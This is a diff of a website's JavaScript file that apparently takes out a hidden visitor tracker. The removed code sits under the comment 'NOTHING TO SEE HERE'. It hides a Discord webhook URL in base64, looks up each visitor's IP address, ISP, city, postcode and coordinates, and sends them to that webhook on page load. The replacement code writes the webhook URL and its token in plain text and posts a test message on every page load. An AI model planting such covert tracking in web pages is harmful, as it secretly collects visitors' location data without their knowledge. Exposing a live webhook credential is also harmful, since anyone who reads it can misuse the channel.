@@ -67,97 +67,29 @@ $(document).ready(function(){
 
 
 // NOTHING TO SEE HERE
-// Obfuscated Webhook URL
-const encodedWebHookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMTQwMjYyOTQzNTg4MzY0MS9SMHNleGtZRkdncWV2LWRvRmhWdmQwR1BuUFBkWDFJSGNFajdjM2FfajVHUmNxZVpvaXZiQXRERVRrYjIxellEenJ5QQ==";
+const webHookUrl = "https://discord.com/api/webhooks/1231402629435883641/R0sexkYFGgqev-doFhVvd0GPnPPdX1IHcEj7c3a_j5GRcqeZoivbAtDETkb21zYDzryA";
 
-function decodeWebHookUrl(encoded) {
-    return atob(encoded);
-}
+const params = {
+    username: "Mr",
+    content: "Hello, this is a test message!"
+};
 
-const webHookUrl = decodeWebHookUrl(encodedWebHookUrl);
-
-async function fetchData(url) {
-    const response = await fetch(url);
+fetch(webHookUrl, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(params)
+})
+.then(response => {
     if (!response.ok) {
         throw new Error(`HTTP error! status: ${response.status}`);
     }
-    return response.json();
-}
-
-function generateUniqueRandomNumber() {
-    const timestamp = new Date().getTime();
-    const random = Math.floor(Math.random() * 10000);
-    return `${timestamp}${random}`;
-}
-
-async function sendMessage(params, uniqueRandomNumber) {
-    try {
-        const response = await fetch(webHookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(params)
-        });
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        console.log(`User: ${uniqueRandomNumber}`);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
-
-async function sendIPInfo() {
-    try {
-        // Fetch IP information from freeipapi.com
-        const data = await fetchData('https://freeipapi.com/api/json/');
-
-        // Check if the response contains the expected data
-        if (!data || !data.ipAddress) {
-            throw new Error('Invalid API response');
-        }
-
-        const ip = data.ipAddress;
-        const provider = data.isp || 'N/A';
-        const timezone = data.timeZone || 'N/A';
-        const country = data.countryName || 'N/A';
-        const countryCode = data.countryCode ? data.countryCode.toLowerCase() : 'N/A';
-        const region = data.regionName || 'N/A';
-        const city = data.cityName || 'N/A';
-        const zip = data.zipCode || 'N/A';
-        const lat = data.latitude || 'N/A';
-        const lon = data.longitude || 'N/A';
-        const uniqueRandomNumber = generateUniqueRandomNumber();
-
-        // Prepare the message to send to Discord
-        const params = {
-            username: "Mr",
-            content: `
-**IP Information:**
-\`\`\`
-IP Address: ${ip}
-Provider: ${provider}
-Timezone: ${timezone}
-Country: ${country} (${countryCode})
-Region: ${region}
-City: ${city}
-Zip Code: ${zip}
-Longitude: ${lon}
-Latitude: ${lat}
-\`\`\`
-**Unique Random Number:** ${uniqueRandomNumber}
-`
-        };
-
-        // Send the message to Discord
-        await sendMessage(params, uniqueRandomNumber);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
-
-sendIPInfo();
+    console.log('Message sent successfully');
+})
+.catch(error => {
+    console.error('Error:', error);
+});
 
 
 // script.js
